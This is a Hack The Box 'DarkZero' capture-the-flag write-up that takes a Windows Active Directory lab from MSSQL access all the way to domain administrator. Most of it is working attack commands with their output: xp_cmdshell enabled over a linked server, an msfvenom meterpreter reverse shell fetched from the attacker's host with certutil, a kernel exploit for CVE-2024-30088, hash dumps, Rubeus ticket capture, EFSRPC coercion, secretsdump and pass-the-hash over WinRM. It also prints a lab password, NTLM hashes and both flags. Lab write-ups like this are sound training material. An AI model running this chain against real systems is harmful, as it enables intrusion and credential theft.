---
layout: default
title: HTB DarkZero — Short Writeup
---

# Hack The Box — DarkZero (Hard)

Short explanations precede each preserved code+output block. Code and outputs kept verbatim for reproducibility.

---

## Recon
Map hostnames for lab convenience.

```bash
echo "10.129.26.13 DC01.darkzero.htb DC01 darkzero.htb" >> sudo tee -a /etc/hosts
```

---

## MSSQL Access & Linked Servers
Connect to MSSQL and enumerate linked servers.

```text
impacket-mssqlclient john.w@dc01.darkzero.htb -windows-auth
```

```text
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   

SQL (darkzero\john.w  guest@master)>
```

---

## Enable xp_cmdshell and verify identity
Enable xp_cmdshell on linked server and check identity.

```sql
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
EXEC ('xp_cmdshell "whoami"') AT [DC02.darkzero.ext]
```

```text
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell "whoami"') AT [DC02.darkzero.ext]
output                 
--------------------   
darkzero-ext\svc_sql   

NULL                   

SQL (darkzero\john.w  guest@master)>
```

---

## Payload build & host
Create meterpreter payload and serve over HTTP.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.73 LPORT=9999 -f exe -o reverse.exe
python3 -m http.server 8000
```

```bash
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: reverse.exe
```

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

---

## Fetch & execute payload remotely
Use certutil via xp_cmdshell to fetch and run payload.

```sql
EXEC ('xp_cmdshell "certutil -urlcache -f http://10.10.14.73:8000/reverse.exe C:\\Users\\Public\\reverse.exe"') AT [DC02.darkzero.ext]
EXEC ('xp_cmdshell "C:\\Users\\Public\\reverse.exe"') AT [DC02.darkzero.ext]
```

```text
output                                                
---------------------------------------------------   
****  Online  ****                                    

NULL                                                  

NULL                                                  

CertUtil: -URLCache command completed successfully.   

NULL                                                  

SQL (darkzero\john.w  guest@master)>
```

---

## Meterpreter session
Handler accepted session; check current user.

```text
msf exploit(multi/handler) > run
```

```text
[*] Started reverse TCP handler on 10.10.14.73:9999
[*] Sending stage (230982 bytes) to 10.129.26.13
[*] Meterpreter session 4 opened (10.10.14.73:9999 -> 10.129.26.13:59230) at 2025-11-02 03:47:58 +0900

meterpreter > shell
Process 640 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
darkzero-ext\svc_sql
```

---

## Kernel LPE exploit
Exploit CVE-2024-30088 to get SYSTEM.

```text
msf > search cve 2024 30088
msf > use exploit/windows/local/cve_2024_30088_authz_basep
msf exploit(windows/local/cve_2024_30088_authz_basep) > set SESSION 4
msf exploit(windows/local/cve_2024_30088_authz_basep) > set LHOST 10.10.14.73
msf exploit(windows/local/cve_2024_30088_authz_basep) > run
```

```text
[*] Started reverse TCP handler on 10.10.14.73:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision nu113
[*] Reflectively injecting the DLL into 1504...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 784
[+] Successfully retrieved winlogon pid: 588
[*] Sending stage (230982 bytes) to 10.129.26.13
[*] Meterpreter session 2 opened (10.10.14.73:4444 -> 10.129.26.13:59222) at 2025-11-01 14:
```

---

## Dump & SYSTEM shell
Dump hashes, then confirm SYSTEM and read user flag.

```text
meterpreter > hashdump
meterpreter > shell
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:2f74a511e2a2e7cb3fef33112e4d6525:::

Process 1028 created.
Channel 2 created.
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\System32>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E415-87AD

 Directory of C:\Users\Administrator\Desktop

10/02/2025  01:22 PM    <DIR>          .
09/29/2025  11:14 AM    <DIR>          ..
11/01/2025  11:13 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,319,095,296 bytes free

C:\Users\Administrator\Desktop>type user.txt
type user.txt
19f415c90328323faadefef19c539ab3
```

---

## Rubeus monitoring
Upload Rubeus and monitor Kerberos TGTs.

```text
meterpreter > upload /usr/share/windows-resources/rubeus/Rubeus.exe C:\\Windows\\Temp
C:\Windows\Temp>.\Rubeus.exe monitor /interval:5 /nowrap
```

```text
[*] Uploading  : /usr/share/windows-resources/rubeus/Rubeus.exe -> C:WindowsTemp
[*] Uploaded 271.50 KiB of 271.50 KiB (100.0%): /usr/share/windows-resources/rubeus/Rubeus.exe -> C:WindowsTemp
[*] Completed  : /usr/share/windows-resources/rubeus/Rubeus.exe -> C:WindowsTemp

Directory of C:\Windows\Temp

11/01/2025  04:05 PM           278,016 Rubeus.exe
               1 File(s)        278,016 bytes
               0 Dir(s)   3,318,722,560 bytes free

v1.6.4

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs

[*] 11/2/2025 2:00:06 AM UTC - Found new TGT:

  User                  :  DC02$@DARKZERO.EXT
  StartTime             :  11/1/2025 11:09:53 AM
  EndTime               :  11/1/2025 9:08:52 PM
  RenewTill             :  11/8/2025 10:08:52 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqE
```

---

## Coerce & EFSRPC abuse
Use coercer to force RPC interactions and generate tickets.

```bash
coercer coerce -u john.w -p 'RFulUtONCOL!' -d darkzero.htb -l DC02.darkzero.ext -t 10.129.26.13
```

```text
[info] Starting coerce mode
[info] Scanning target 10.129.26.13
[*] DCERPC portmapper discovered ports: 49664,49665,49666,49668,49670,49895,49674,62251,52685,49936,49880
[+] SMB named pipe '\\PIPE\\efsrpc' is accessible!
   [+] Successful bind to interface (df1941c5-fe89-4e79-bf10-463657acf44d, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\DC02.darkzero.ext\ICRZntuo\file.txt\x00')
```

---

## Ticket conversion & secretsdump
Convert captured kirbi to ccache and dump NTDS secrets.

```bash
echo "<BASE64_KIRBI>" | base64 -d > dc01.kirbi
impacket-ticketConverter dc01.kirbi dc01.ccache
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass -just-dc DC01.darkzero.htb
```

```text
[*] converting kirbi to ccache...
[+] done

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
...
[*] Kerberos keys grabbed
```

---

## Admin WinRM shell
Use dumped Administrator hash to access via WinRM and retrieve flags.

```bash
evil-winrm -i 10.129.26.13 -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type *
939854ef74759c980480429f6df91139
19f415c90328323faadefef19c539ab3
```

---

## Flags
- **user.txt:** `19f415c90328323faadefef19c539ab3`
- **root.txt:** `939854ef74759c980480429f6df91139`

---

*This GitHub Pages version uses YAML frontmatter and preserves original outputs.*

